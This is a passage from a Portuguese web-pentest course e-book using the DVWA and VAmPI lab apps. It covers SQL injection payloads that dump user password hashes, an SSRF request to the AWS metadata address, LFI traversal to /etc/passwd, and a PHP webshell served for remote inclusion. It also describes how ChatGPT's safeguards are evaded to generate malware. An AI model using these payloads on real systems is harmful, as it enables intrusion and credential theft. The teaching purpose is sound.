3.4. Ataques de Injeção 
Antes de começarmos, precisamos garantir que nossa configuração de segurança DVWA 
seja baixa. 

 
 
 
O DVWA é vulnerável aos ataques de injeção de SQL. A vulnerabilidade surge de 
concatenar diretamente a entrada do usuário na consulta SQL sem a sanitização ou 
parametrização adequada. 
No código, a variável $id é recuperada da entrada do usuário sem qualquer validação ou 
sanitização. Ele é então concatenado diretamente na cadeia de consulta SQL: 
$id = $_REQUEST['id']; 
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
Isso permite que um invasor manipule o valor de $id e injetar código SQL malicioso, 
potencialmente levando a acesso não autorizado, vazamento de dados ou até mesmo 
perda completa de dados. 
Vá até a função de SQL Injection do DVWA e insira o User ID: 1. 
 
Note que a aplicação retornou na tela informações que buscou no banco de dados.  
Agora vamos ver o código fonte para baixa segurança, podemos ver que é uma consulta 
muito simples, sem qualquer segurança. 

 
 
 
Agora digite  1' OR '1'='1'# na caixa de texto para observamos a resposta. 
 
Note que a aplicação não realiza o tratamento adequado do input e retorna a lista de 
usuários existentes. 
Já que conseguimos enumerar a lista de usuários, podemos evoluir o teste e tentar 
enumerar os nomes de tabelas ou colunas no banco de dados. 
Através da injeção no parâmetro ID durante a interceptação do Burp e possível a alteração 
1 or 1= 1. 

 
 
 
Podemos também testar a seguinte injeção. 
1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users 
O que cada parte da consulta faz? 
1 OR 1=1: 
• Essa é uma parte típica de injeções SQL. 1=1 é sempre verdadeiro, o que faz com 
que toda a condição no WHERE da consulta original (não mostrada) seja ignorada. 
• 1 OR 1=1 torna a condição sempre verdadeira, o que, na prática, significa que todos 
os registros do banco de dados serão retornados, independentemente de qualquer 
filtro que existia originalmente. 
UNION: 
• O UNION combina os resultados da consulta original (que não é mostrada) com os 
resultados da segunda consulta, que estamos injetando. Isso significa que o 
resultado final incluirá dados da consulta original mais os dados que estamos 
solicitando na consulta injetada. 
SELECT group_concat(user_id, first_name, last_name), group_concat(password): 
• group_concat(...) é uma função SQL que concatena valores de várias linhas em 
uma única string, separada por vírgulas. 
• group_concat(user_id, first_name, last_name): Esta parte concatena 
os valores das colunas user_id, first_name, e last_name de todos os registros na 

 
 
tabela users, colocando-os em uma única string. O resultado pode ser algo como: 
1JohnDoe,2JaneSmith,3AlexJohnson,.... 
• group_concat(password): Essa parte concatena todas as senhas da tabela 
users em uma única string. 
FROM users: 
• Está especificando que os dados estão sendo extraídos da tabela chamada users, 
onde estão armazenados os IDs de usuários, nomes e senhas. 
Vamos testar outra injeção. 
1' union select group_concat(user_id,first_name,last_name),group_concat(password) from users; # 
 
Note que com essa nova consulta conseguimos concatenar campos de diferentes tabelas 
para chegarmos ao hash das senhas dos usuários. 
Vamos utilizar agora o chatgpt para descobrirmos qual algoritmo de hash é utilizado para 
encriptar a senha e o valor do arquivo decriptado. 
 

 
 
3.5. Server-side Request Forgery 
Como dito nos capítulos anteriores, o SSRF é uma vulnerabilidade que permite a um 
atacante fazer requisições do servidor da aplicação para outros serviços internos ou 
externos. 
Abaixo trago um exemplo básico de código Python vulnerável a SSRF e uma breve 
explicação: 
import requests 
from flask import Flask, request, jsonify 
  
app = Flask(__name__) 
  
# Rota que recebe a URL para a qual o servidor fará a requisição 
@app.route('/fetch', methods=['GET']) 
def fetch_data(): 
    # Obtém a URL fornecida pelo usuário 
    url = request.args.get('url') 
  
    # Faz a requisição para a URL fornecida (Vulnerável a SSRF ☹) 
    try: 
        response = requests.get(url) 
        return jsonify({ 
            "status": "success", 
            "data": response.text 
        }) 
    except requests.RequestException as e: 
        return jsonify({ 
            "status": "error", 
            "message": str(e) 
        }), 500 
  
if __name__ == '__main__': 
    app.run(debug=True) 
Problema (Vulnerabilidade SSRF) 
Este código permite que o usuário forneça qualquer URL, incluindo endereços internos, 
como http://localhost ou http://169.254.169.254 (no caso de servidores na nuvem, como 
AWS), podendo acessar recursos internos que não deveriam ser expostos. 
Exemplo de ataque SSRF: 
Se o servidor estiver hospedado na AWS, um invasor poderia fazer uma requisição para 
o serviço de metadados da AWS e obter informações sensíveis: 
http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/ 
 

 
 
Mitigação 
• Validação de URLs: Implementar uma lista de URLs permitidas (whitelisting) ou 
verificar se o domínio é confiável. 
• Restringir requisições a IPs internos: Evitar que o servidor faça requisições a 
IPs internos como 127.0.0.1, localhost, ou intervalos de IPs reservados para redes 
privadas. 
• Timeout e Limites de requisições: Aplicar limites e tempo de resposta para 
requisições externas. 
Teste Prático no DVWA 
1. Na aplicação DVWA, há um ponto vulnerável a SSRF na seção de "File 
Inclusion" (Inclusão de Arquivos). Esta funcionalidade aceita URLs que podem 
ser exploradas para realizar requisições maliciosas do lado do servidor. 
2. Após logar no DVWA, vá até a seção "File Inclusion". 
3. Aqui, o aplicativo solicita que você forneça um caminho ou URL para incluir 
arquivos. Este é o ponto de entrada para nossa exploração SSRF. 
 
4. Vamos testar uma URL Local e verificar se a aplicação irá acessar o recurso. 
Uma forma comum de testar SSRF é tentar acessar um recurso local do servidor 
ou outros serviços internos. 

 
 
 
5. Note na imagem acima que substitui o valor do arquivo a ser incluído por um 
endereço da própria máquina (127.0.0.1). Isso forçou o servidor a fazer uma 
requisição para si mesmo. Se o servidor retornar a resposta (geralmente uma 
página de erro ou um recurso interno), você confirmou a vulnerabilidade SSRF. 
3.8. LFI/RFI 
Inclusão de arquivos locais e remotos pode permitir a um atacante acessar arquivos 
sensíveis ou executar código malicioso. Isso pode levar aos seguintes ataques: 
• Execução de código no servidor web 
• Ataques de Cross Site Scripting (XSS) 
• Negação de serviço (DOS) 
• Ataques de manipulação de dados 
Vulnerabilidades LFI permitem que um invasor leia (e às vezes execute) arquivos na 
máquina da vítima. Isso pode ser muito perigoso porque se o servidor web estiver mal 
configurado e rodando com altos privilégios, o invasor pode obter acesso a informações 
confidenciais.  
Vulnerabilidades RFI são mais fáceis de explorar, mas menos comuns. Em vez de acessar 
um arquivo na máquina local, o invasor consegue executar código hospedado em sua 
própria máquina. 
Exemplo de exploração de LFI no DVWA 

 
 
1. Faça login no DVWA, depois vá para a aba de segurança do DVWA e altere o nível 
de dificuldade para baixo. 
2. Vá para a aba de inclusão de arquivo e altere a URL  
de incude.php para ?page=../../../../../../etc/passwd. 
 
 
 
 
3. altere a URL 
de ?page=../../../../../../etc/passwd para ?page=../../../../../../proc/version. 
 
 

 
 
4. Agora, vamos tentar explorar essa vulnerabilidade usando arquivos remotos 
hospedados na máquina do invasor. 
5. Vamos criar um arquivo malicioso em .php (webshell) e subir num servidor python 
temporário para testar se o DVWA permitirá a inclusão deste arquivo remoto na 
aplicação. 
<?php 
echo "Exploração de RFI bem-sucedida!<br>"; 
system($_GET['cmd']); 
?> 
5. Salve este arquivo no sistema de arquivos em uma pasta qualquer do seu computador 
com o nome webshell.php. 
6. Navegue até a pasta onde está hospedado este arquivo e execute o seguinte 
comando python: 
python3 -m http.server 
7. O servidor python temporário estará pronto para receber conexões: 
 
Mitigação 
• Validação de Caminhos: Restrição e validação de entradas para prevenir inclusão 
de arquivos. 
• Desativar Inclusão Remota: Desabilitar funções de inclusão remota no PHP. 
• Permissões de Arquivos: Aplicar permissões adequadas aos arquivos no 
servidor. 
 
 
 

 
 
UNIDADE 4 – Teste de vulnerabilidade em APIs 
Nesta unidade, vamos nos aprofundar no entendimento das Application Programming 
Interface, ou APIs. Utilizando ferramentas apropriadas iremos descobrir e levantar 
informações relevantes deste tipo de aplicação e explorar as vulnerabilidades mais 
comuns. 
OBJETIVOS DA UNIDADE 
Ao final dos estudos, você deverá ser capaz de: 
● Realizar a descoberta e coleta de informações de APIs 
● Testar rate_limit e enumeração de dados 
● Explorar as vulnerabilidades mais comuns em APIs 
 
Descoberta e Coleta de Informações de APIs 
Identificação de Endpoints 
O primeiro passo para testar a segurança de uma API é identificar seus endpoints. 
Endpoints são os pontos de acesso ao as funcionalidades da API, e cada um deles pode 
representar um recurso ou uma ação específica. A descoberta de endpoints é importante 
para mapear as funcionalidades expostas pela API, você deve ter observado que essa 
atividade de descoberta soa familiar, mas é isto mesmo, a descoberta de APIs é um 
processo de Recon que você aprendeu na unidade 2 deste e-book. 
Técnicas para Encontrar Endpoints de APIs 
Existem várias abordagens para identificar endpoints de APIs, incluindo: 
• 
Análise de Tráfego: Utilizando ferramentas como Burp Suite ou OWASP ZAP, 
você pode interceptar e analisar o tráfego de uma aplicação que consome a API. 
Isso permite identificar os URIs dos endpoints e os dados enviados e recebidos. 

 
 
• 
Fuzzing: Essa técnica envolve enviar solicitações automatizadas a uma API com 
variações de URLs, métodos HTTP e parâmetros para descobrir endpoints não 
documentados ou ocultos. 
• 
Exploração de Documentação: Muitas APIs públicas oferecem documentações 
detalhadas, como Swagger ou OpenAPI, que descrevem todos os endpoints 
disponíveis, os parâmetros esperados, e as respostas possíveis. 
Análise de Documentação 
Muitas APIs vêm acompanhadas de uma documentação que pode ser uma mina de ouro 
para a coleta de informações. A documentação geralmente inclui uma lista de endpoints, 
exemplos de chamadas API, tipos de dados aceitos e retornados, e detalhes sobre 
autenticação e autorização. 
Como utilizar documentação oficial e Swagger 
• 
Swagger/OpenAPI: Estas ferramentas geram documentações interativas que 
permitem explorar os endpoints disponíveis e realizar testes diretamente na 
interface web. Ao acessar uma documentação Swagger, você pode visualizar todos 
os endpoints expostos e detalhes sobre como interagir com cada um deles. 
• 
Utilizando a documentação para teste: Examine a documentação para identificar 
endpoints sensíveis, como aqueles que manipulam dados confidenciais ou que 
permitem operações administrativas. Utilize essa informação para focar seus testes 
em áreas críticas. 
Ferramentas para Descoberta de APIs 
Para os cenários descritos neste e-book utilizaremos o VAmPI. Você pode acessá-lo e 
encontrar 
maiores 
informações 
na 
página 
oficial 
do 
projeto 
no 
GitHub 
https://github.com/erev0s/VAmPI. 
VAmPI é uma API vulnerável feita com Flask e inclui vulnerabilidades do OWASP top 10 
ameaças para APIs. Sua função restringe-se ao ambiente acadêmico, pois possibilita 
avaliar a eficiência das ferramentas usadas para detectar problemas de segurança em 
APIs.  

 
 
Características: 
• Baseado em OWASP Top 10 vulnerabilidades para APIs. 
• Especificações OpenAPI3 e Postman Collection incluídas. 
• Opção ON/OFF para ter um ambiente vulnerável ou não. 
• Autenticação baseada em token (ajuste da vida útil do token dentro do app.py) 
• Disponível Swagger UI para interagir diretamente com a API 
Instalação no Kali Linux 
Como existe uma imagem do VAmPI no Dockerhub, precisamos apenas referenciar a 
imagem e porta que irá rodar na estação local.  
$sudo service docker start  
$sudo docker run -p 5000:5000 erev0s/vampi:latest 
O primeiro comando irá certificar que o docker está rodando. Sem ele, o comando seguinte 
não irá rodar. 
Você pode testar se a aplicação está rodando acessando diretamente pelo navegador por 
meio da URL http://127.0.0.1:5000/. 
 
A aplicação também disponibiliza uma interface gráfica do Swagger API (Documentação 
da API) em http://127.0.0.1:5000/ui/.  

 
 
  
Como funciona? 
• O fluxo de ações do VAmPI é:  
1. Um usuário não registrado pode ver informações mínimas sobre os usuários 
fictícios incluídos na API.  
2. Um usuário pode se registrar e então fazer login para ser autorizado a usar o 
token recebido durante o login para postar um livro.  
3. Para um livro postado os dados aceitos são o título e um segredo sobre esse 
livro.  
4. Cada livro é único para cada usuário e apenas o proprietário do livro deve ser 
permitido ver o segredo. 
Uma breve descrição das ações incluídas pode ser vista na tabela a seguir: 
Método 
Rota 
Detalhes 
GET 
/createdb 
Cria e preenche o banco de dados com 
dados fictícios 
GET 
/ 
Página inicial do VAmPI 

 
 
Método 
Rota 
Detalhes 
GET 
/users/v1 
Exibe todos os usuários com informações 
básicas 
GET 
/users/v1/_debug 
Exibe todos os detalhes de todos os 
usuários 
POST 
/users/v1/register 
Registra um novo usuário 
POST 
/users/v1/login 
Login no VAmPI 
GET 
/users/v1/{username} 
Exibe o usuário pelo nome de usuário 
DELETE 
/users/v1/{username} 
Exclui o usuário pelo nome de usuário 
(Somente Admins) 
PUT 
/users/v1/{username}/email 
Atualiza o email de um único usuário 
PUT 
/users/v1/{username}/password 
Atualiza a senha do usuário 
GET 
/books/v1 
Recupera todos os livros 
POST 
/books/v1 
Adiciona um novo livro 
GET 
/books/v1/{book} 
Recupera o livro pelo título junto com o 
segredo 
O VAmPI fornece collection montada em formato .json e .yml com todas as requisições, 
header e body para testar a API. Você pode encontrá-la no diretório openapi_specs ou no 
repositório da solução em https://github.com/erev0s/VAmPI/tree/master/openapi_specs. 
Kiterunner 
Excelente ferramenta para descobrir endpoints de API. Use-o para verificar caminhos e 
parâmetros por meio de força bruta contra APIs de destino. 
A solução está disponível para download em https://github.com/assetnote/kiterunner. 
Instalação 
1. Abra o Kali Linux e atualize o sistema com os seguintes comandos: 

 
 
sudo apt update && sudo apt upgrade -y 
sudo apt install -y build-essential git 
2. Instale as dependências necessárias para compilar e rodar o Kiterunner: 
sudo apt install -y golang 
3. Configure o ambiente para garantir que o Go seja instalado corretamente: 
echo 'export GOPATH=$HOME/go' >> ~/.bashrc 
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc 
source ~/.bashrc 
4. Clone o repositório do Kiterunner e instale-o: 
cd /opt 
sudo git clone https://github.com/assetnote/kiterunner.git 
cd kiterunner 
sudo make 
sudo cp dist/kr /usr/local/bin 
5. Verifique se o Kiterunner foi instalado corretamente executando: 
kr -h 
6. Após a instalação, você pode baixar a extensa wordlist para enumeração de 
diretórios disponível no próprio repositório da solução routes-large.kite.tar.gz. 
7. Disponibilizei para meus alunos uma wordlist própria para testes do VAmPI, você 
pode obtê-la através do link abaixo: 
https://drive.google.com/file/d/1ThTCqbrlYYvONovb2mjIcPvhoeHpEydj/view?usp=sharing. 
8. Use o Kiterunner com essa wordlist para explorar o VAmPI: 
kr scan http://127.0.0.1:5000 -w wordlist.kite -x10 -t50s 
• Substitua http://vampi.target.url pelo endereço correto do VAmPI. 
• -w para adicionar a wordlist 
• -x para informar o número de conexões por host 

 
 
• -t tempo para finalizar o scan em caso de timeout 
Cherrybomb 
É uma ferramenta de segurança da API que verifica sua API com base em um arquivo 
OAS (OpenAPI Specification). 
A solução está disponível para download em https://github.com/blst-security/cherrybomb 
Perfis de teste do Cherrybomb 
• info: gera somente tabelas de parâmetros e de endpoint 
• normal: ativa e passiva 
• active: ativo e intrusivo [em desenvolvimento] 
• passive: apenas testes passivos 
• full: todas as opções 
• owasp: testa as falhas com base no OWASP Top 10 API 
Instalação 
1. Instale os pré-requisitos para a solução rodar normalmente: 
sudo apt install cargo nodejs npm -y 
2. Mova o executável do cherrybomb para dentro da pasta /usr/local/bin 
sudo mv ./target/release/cherrybomb /usr/local/bin/ 
3. Salve o arquivo https://github.com/erev0s/VAmPI/tree/master/openapi_specs/ 
openapi3.yml disponível dentro do repositório do VAmPI no seu computador  
4. Submeta o arquivo ao ChatGPT e peça para convertê-lo para o formato .json. 
5. Abra o arquivo .json gerado pelo ChatGPT e copie o conteúdo 
6. De volta ao Kali abra o editor nano e cole o conteúdo do arquivo. 
sudo nano openapi.json 
7. Rode o Checkbomb para análise do arquivo OAS. 

 
 
cherrybomb --file <PATH> --profile profile 
Note que o resultado nos traz informações importantes sobre o alvo. 
Muitas vezes os desenvolvedores deixam arquivos de especificações de APIs abertos 
publicamente. Isso pode servir de  
 
Postman 
O Postman é uma ferramenta utilizada por desenvolvedores e engenheiros de QA (Quality 
Assurance) para testar APIs (Application Programming Interfaces). Ele permite que os 
usuários enviem solicitações HTTP e vejam as respostas diretamente em uma interface 
gráfica.  
Com ele, podemos criar, organizar e compartilhar conjuntos de requisições (chamadas 
"collections"), automatizar testes e documentar APIs. Você pode baixá-lo através do 
endereço https://www.postman.com/downloads/ e instalar no sistema operacional nativo 
do seu equipamento. 
Passo a Passo para Adicionar uma Collection no Postman  
1. Configurar o Postman para Usar o Burp Suite: 
o Abra o Postman. 

 
 
o Vá para "Settings" no Postman, geralmente acessado pelo ícone de 
engrenagem no canto superior direito. 
o Na aba “General”, desmarque a opção SSL certificate verification. 
o Na aba "Proxy", insira as seguintes configurações: 
▪ 
Proxy Type: HTTP 
▪ 
Proxy Server: 127.0.0.1 (ou o endereço do servidor onde o Burp 
Suite está em execução) 
▪ 
Port: 8080 (ou a porta que você configurou no Burp Suite) 
o Salve as configurações. 
2. Criar ou Importar uma Collection no Postman: 
o No Postman, clique em "New" no canto superior esquerdo da ferramenta e 
depois selecione "Collection". 
o Dê um nome à collection e adicione solicitações HTTP (GET, POST, PUT, 
DELETE etc.) que você deseja testar. 
o Você também pode importar uma collection existente, clicando em "Import" 
e selecionando o arquivo da collection. 
▪ 
Importe a collection do VAmPI em formato .json que você baixou. 
▪ 
A lista de requisições aparece ao lado esquerdo da ferramenta, 
conforme imagem abaixo: 
 
3. Enviar Requisições e Monitorar no Burp Suite: 
• Com a collection criada, selecione uma das requisições e clique em "Send". 

 
 
• As solicitações enviadas pelo Postman serão encaminhadas através do Burp 
Suite. 
• No Burp Suite, vá para a aba "HTTP history" para ver as requisições e 
respostas capturadas. 
• Você pode inspecionar, modificar e re-enviar as requisições conforme 
necessário. 
4. Enviar Requisições e Monitorar no OWASP ZAP: 
• Assim como no Burp Suite, configure o ZAP como proxy no Postman.  
• Na aba "Proxy", insira as seguintes configurações: 
o Proxy Type: HTTP 
o Proxy Server: 127.0.0.1 (ou o endereço do servidor onde o Burp Suite 
está em execução) 
o Port: 8081 (ou a porta que você configurou no OWASP ZAP) 
• Volte ao OWASP ZAP e utilize o "Spider" ou "Forced Browse" para 
automaticamente tentar encontrar novos endpoints explorando diretórios e 
URLs possíveis 
 

 
 
4.1. 
Entendendo Application Programming Interface (API) Web 
O que são APIs? 
 
As APIs (Application Programming Interfaces) são elementos essenciais no 
desenvolvimento de software moderno. Elas permitem que diferentes sistemas se 
comuniquem de maneira eficiente, facilitando a integração e a troca de dados. Pense em 
uma API como um intermediário entre duas aplicações, possibilitando que elas troquem 
informações ou realizem ações sem que uma precise saber os detalhes de funcionamento 
da outra. 
As APIs são uma maneira simplificada de conectar a própria infraestrutura por meio do 
desenvolvimento de aplicações nativas em nuvem. No entanto, elas também possibilitam 
o compartilhamento de dados com clientes e outros usuários externos. As APIs públicas 
agregam valor de negócios porque simplificam e ampliam como você se conecta aos 
parceiros, além de, possivelmente, monetizar seus dados. Um exemplo famoso é a API 
do Google Maps. 
 
Contudo, assim como qualquer outro componente de software, as APIs também podem 
ser alvos de ataques, e a segurança delas é fundamental para proteger os dados e a 
integridade dos sistemas. 
 
Tipos de APIs 
Existem diversos tipos de APIs, cada uma com suas características e usos específicos. 
Os principais tipos são: 

 
 
• 
REST (Representational State Transfer): Atualmente a arquitetura mais utilizada 
pelos desenvolvedores, pois permite a comunicação entre sistemas de forma 
simples e escalável. APIs RESTful utilizam métodos HTTP padrão, como GET, 
POST, PUT e DELETE, para realizar operações sobre os dados.  
• 
SOAP (Simple Object Access Protocol): Um protocolo de comunicação mais 
complexo e rigoroso que utiliza XML para codificar suas mensagens. SOAP é mais 
adequado para ambientes onde a segurança e a transação são cruciais. 
• 
GraphQL: Uma linguagem de consulta para APIs que permite solicitar apenas os 
dados necessários, o que pode melhorar o desempenho e a eficiência das 
consultas. 
Arquitetura e Funcionamento das APIs 
Estrutura de uma API RESTful 
Quando um cliente faz uma solicitação usando uma API RESTful, essa API transfere 
uma representação do estado do recurso ao solicitante ou endpoint. Essa informação 
(ou representação) é entregue via HTTP utilizando principalmente o formato Javascript 
Object Notation (JSON). O formato JSON é mais usado porque, apesar de seu nome, é 
independente de qualquer outra linguagem e pode ser lido por máquinas e humanos.  
Lembre-se também de que cabeçalhos e parâmetros são importantes nos métodos 
HTTP de uma solicitação HTTP de API RESTful porque contêm informações relevantes 
sobre o identificador, bem como metadados, autorização, Uniform Resource Identifier 
(URI), cache, cookies e outras informações da solicitação. Como vimos na unidade 1 
deste e-book, existem os cabeçalhos da solicitação e os cabeçalhos da resposta, cada 
um contendo as informações de suas respectivas conexões HTTP e códigos de status. 
Isto posto, uma API RESTful é projetada para operar seguindo os princípios REST, 
quando incluem: 
• 
Recursos: Qualquer dado ou funcionalidade que possa ser manipulada por uma 
API é considerado um recurso. Cada recurso é identificado por uma URL única. 
• 
Métodos HTTP: Os métodos HTTP são utilizados para interagir com os recursos: 
o GET: Recupera informações sobre o recurso. 

 
 
o POST: Cria um novo recurso. 
o PUT: Atualiza um recurso existente. 
o DELETE: Remove um recurso. 
• 
Status Codes: Ao interagir com uma API, o servidor retorna um código de status 
HTTP que indica o sucesso ou falha da operação. Alguns dos códigos mais comuns 
incluem: 
o 200 OK: A operação foi bem-sucedida. 
o 400 Bad Request: A solicitação foi malformada ou inválida. 
o 401 Unauthorized: Acesso não autorizado. 
o 404 Not Found: O recurso solicitado não foi encontrado. 
o 500 Internal Server Error: Ocorreu um erro no servidor. 
 
Importância das APIs no Desenvolvimento Moderno 
Muitas vezes, as necessidades empresariais mudam rapidamente para responder aos 
mercados digitais em transformação. Nesse ambiente, novos concorrentes podem 
redefinir o setor inteiro com uma nova aplicação. Para manter a competitividade, é 
importante oferecer suporte à implantação e desenvolvimento rápidos de serviços 
inovadores.  
Neste cenário as APIs simplificam a construção de aplicações modernas, pois permitem 
que diferentes serviços e aplicações se integrem de forma eficaz em qualquer arquitetura 
preexistente. Elas são a espinha dorsal de muitos sistemas, desde aplicações móveis até 
serviços em nuvem e plataformas de redes sociais. Sem APIs, a interoperabilidade entre 
diferentes sistemas seria significativamente mais complexa e menos eficiente. 
Checklist eficaz para Teste de Vulnerabilidades em APIs 
• Escalação de privilégio: teste pontos finais com níveis de privilégio variados para 
identificar possibilidades de acesso não autorizado. 
• Configurações incorretas do CORS: investigue as configurações do CORS para 
explorar potenciais ataques de CSRF em sessões autenticadas. 

 
 
• Descoberta de endpoint: Aproveite os padrões da API para descobrir endpoints 
ocultos. Ferramentas como fuzzers podem automatizar esse processo. 
• Manipulação de parâmetros: Experimente adicionar ou substituir parâmetros em 
solicitações para acessar dados ou funcionalidades não autorizados. 
• Teste de método HTTP: Altere os métodos de solicitação (GET, POST, PUT, 
DELETE, PATCH) para descobrir comportamentos inesperados ou informações 
incorretamente divulgadas. 
• Manipulação de tipo de conteúdo: Alterne entre diferentes tipos de conteúdo (x-
www-form-urlencoded, 
application/xml, 
application/json) 
para 
testar 
vulnerabilidades. 
• Técnicas avançadas de parâmetros: teste com tipos de dados inesperados em 
payloads JSON. Além disso, tente poluir parâmetros e caracteres curingas para 
testes mais amplos. 
• Teste de versão: versões mais antigas da API podem ser mais suscetíveis a 
ataques. Sempre verifique e teste em relação a várias versões da API. 
 
4.2. Instalando ferramentas para descoberta e teste 
4.3. Recon de API 
4.4. OWASP API Security Top 10 
4.5. Elaborando relatório de Pentest 
 
UNIDADE 5 – Ameaças Modernas 
Chegamos ao final da nossa jornada, mas antes não podemos deixar de entender os tipos 
de ataques mais inovadores e recém-descoberto nas aplicações webs modernas. Iremos 
abordar o uso da inteligência artificial no processo de teste de aplicação e como que com 
aplicações e recursos apropriados entender como coisas interessantes podem ser feitas. 
Obrigado pela leitura até aqui.  
 

 
 
OBJETIVOS DA UNIDADE 
Ao final dos estudos, você deverá ser capaz de: 
● Aula 19: Utilizando o chatGPT e explorando recursos de IA 
● Aula 20: Entendendo e simulando ataques ao sistema biométrico 
 
5.1. Utilizando o chatGPT e explorando recursos de IA 
 
O que é o Chat GPT? 
 
Você com certeza já ouviu falar do Chat GPT em algum momento dos últimos anos, mas 
talvez não tenha entendido completamente o que é. 
O Chat GPT (Generative Pre-Trained Transformer, ou Transformador Generativo Pré-
treinado em português) é um chatbot baseado em Machine e Deep Learning um braço 
da Inteligência Artificial (IA). Ele foi criado pela OpenAI, empresa de pesquisas em IA 
fundada por Sam Altman e Elon Musk em 2015. 
 
Machine Learning x Deep Learning 
 

 
 
Lançado em novembro de 2022, a plataforma se tornou viral rapidamente, chamando 
atenção por sua capacidade de fornecer respostas complexas e precisas, além da 
facilidade de utilização. 
Em poucos anos de existência, o Chat GPT já acumula milhões de usuários ao redor do 
mundo, além de ter incitado resposta de grandes empresas de tecnologia, como o Google, 
e causado impacto em diversos setores – como educação, comunicação e tecnologia. 
 
Em meio a uma tecnologia tão revolucionária, é claro, vem também a controvérsia. Por 
outro lado, ela pode ser útil e colaborar com várias áreas de atuação e profissionais. 
Entretanto, uma ferramenta tão poderosa também pode ser usada para fins ilícitos - o que 
já vem acontecendo. 
Foram tomadas algumas providências, através do bloqueio de certos comandos, mesmo 
assim pessoas más intencionadas encontraram formas de se aproveitar do Chat GPT de 
forma negativa. 
Como o Chat GPT impacta a área de Cibersegurança? 
Uma ferramenta como o Chat GPT pode ser utilizada de diversas formas, especialmente 
na área de cibersegurança, tanto com objetivos éticos e positivos, quanto para fins 
criminosos ou perigosos. 
 
Benefícios 

 
 
Pentest e Bug Bounty 
 
Dentro do Pentest, por exemplo, o Chat CPT pode agir como uma espécie de manual ou 
guia para os pentesters, diminuindo o tempo que esses profissionais investem em 
pesquisa e análise. 
Isso contribui para que o trabalho seja ainda mais ágil e, consequentemente, as empresas 
corrijam as vulnerabilidades encontradas mais rapidamente. 
Veja algumas atividades que o ChatGPT pode ajudar no pentest: 
• Preparação do ambiente e ferramentas 
• Identificação da vulnerabilidade 
• Simulação de Ataques 
• Geração de relatórios 
• Recomendação de mitigação 
• Validação das correções 
• Conscientização e treinamento 
Simular Ataques 
Podemos descrever o cenário de ataque ao ChatGPT e solicitar uma análise de impacto, 
veja um exemplo de exploração utilizando força bruta. 
 

 
 
 
No caso do Bug Bounty, que consiste em profissionais da área de tecnologia que procuram 
e reportam vulnerabilidades para empresas em troca de benefícios e recompensas, 
também pode se beneficiar do Chat GPT. 
Em vídeo publicado por um especialista de cibersegurança, foi criado um scanner e 
relatório automatizado através da ferramenta, que gerou um script para automatizar a 
enumeração de subdomínios, por exemplo. 
No exemplo abaixo, é solicitado que o Chat GPT verifique um código e aponte quais 
vulnerabilidades ele pode apresentar. A IA, então, aponta uma vulnerabilidade XSS e 
explica o motivo. 
 
A seguir temos outro exemplo, do Chat GPT identificando um código malicioso ofuscado 
– ou seja, um código malicioso que estava “disfarçado”. Essa é uma técnica muito usada 
em malwares. Além de identificar, o chatbot ainda apontou qual ameaça representava. 
 

 
 
 
Phishing 
Como a própria plataforma apresenta, ela pode criar textos para serem utilizados em 
phishing - técnica de engenharia social para fraude eletrônica e obtenção de informações, 
ou seja, criação de e-mails falsos em que, ao clicar em um link, um malware é instalado 
no computador ou dispositivo utilizado. 
Dessa forma, o Chat GPT facilita e, principalmente, torna mais convincente o trabalho dos 
criminosos que atuam com o phishing. 
 
Malware e códigos maliciosos 
 
Outro ponto de atenção indicado pelo Chat GPT é a criação de malwarese outros tipos de 
códigos maliciosos. Aqui, é importante ressaltar que a plataforma tomou providências para 

 
 
evitar esse tipo de situação, entretanto, os criminosos ainda têm formas de contorná-las. 
Um exemplo disso é que a ferramenta pode não responder sua solicitação de criação de 
um malware, mas pode gerar o código se você pedir de outra forma, fornecendo as 
instruções sem revelar seus objetivos. 
Em dezembro do ano passado, em uma reportagem, um profissional forneceu as técnicas, 
táticas e procedimentos para a criação de um ransomware pelo Chat GPT e a ferramenta 
obedeceu.  
Embora a IA ofereça tremendas oportunidades, ela também traz novos riscos, incluindo 
ameaças à segurança. Portanto, é imperativo abordar as aplicações de IA com uma 
compreensão clara das ameaças potenciais e dos controles contra elas. Em poucas 
palavras, as principais etapas para abordar a segurança da IA são: 
• Implementar governança de IA 
• Amplie suas práticas de segurança com os ativos de segurança de IA, ameaças 
e controles deste documento. 
• Se você desenvolve sistemas de IA (mesmo que não treine seus próprios modelos): 
o Envolva seus dados e engenharia de IA em suas práticas tradicionais 
(seguras) de desenvolvimento de software. 
o Aplique controles de processo e controles técnicos apropriados por meio 
da compreensão das ameaças, conforme discutido neste documento. 
• Certifique-se de que seus fornecedores de IA aplicaram os controles apropriados. 
• Limite o impacto da IA minimizando dados e privilégios e adicionando supervisão, 
por exemplo, barreiras de proteção e supervisão humana. 
Observe que um sistema de IA pode, por exemplo, ser um Large Language Model (LLM), 
uma função de regressão linear, um sistema baseado em regras ou uma tabela de 
consulta baseada em estatísticas. Ao longo deste documento, fica claro quando quais 
ameaças e controles desempenham um papel. 
5.1. Report do Pentest 
A elaboração de um relatório de pentest é cereja no bolo da jornada de teste de segurança 
em aplicações. Um bom relatório deve comunicar as descobertas, mas também guiar as 
partes interessadas sobre como agir em relação às vulnerabilidades descobertas. A seguir 
irei abordar cada fase do processo de criação de um relatório de pentest, trazendo as 
melhores práticas de mercado e ferramentas que podem auxiliar que seu relatório seja 
eficaz, claro e profissional. 
Fase 1: Preparação do Relatório 
Determine os objetivos do relatório, como informar, educar ou propor ações corretivas. 
Entender o público-alvo: executivos, técnicos ou ambos é o norteador para elaboração do 
relatório. 

 
 
Uma boa prática é criar 2 relatórios, um para equipe técnica demonstrando todo o 
processo de teste, achados e medidas para correção, e outro de demonstre de forma 
analítica a quantidade de riscos encontrados e o impacto ao negócio. O Primeiro deve ser 
entregue e apresentado para a equipe técnica e o segundo enviado a equipe gestora da 
organização. 
Documente claramente o escopo do pentest, quais sistemas foram testados, quais não 
foram e por quê. Inclua as limitações do teste, como restrições de tempo, tipo de ataque 
(negação de serviço, por exemplo) ou acesso. 
O relatório precisa ter o alto nível de clareza, portanto, estabeleça uma estrutura lógica 
na construção: Introdução, Metodologia, Descobertas, Recomendações e Conclusão.12 
Fase 2: Documentação das Atividades de Pentest 
Coleta de Informações 
Registre todas as atividades realizadas durante o pentest, incluindo métodos e 
ferramentas usadas. Faça capturas de tela, grave vídeos e colete logs que alimentem as 
descobertas. 
Ferramentas para Documentação: 
• 
CherryTree: Um editor hierárquico que facilita a organização de notas e dados 
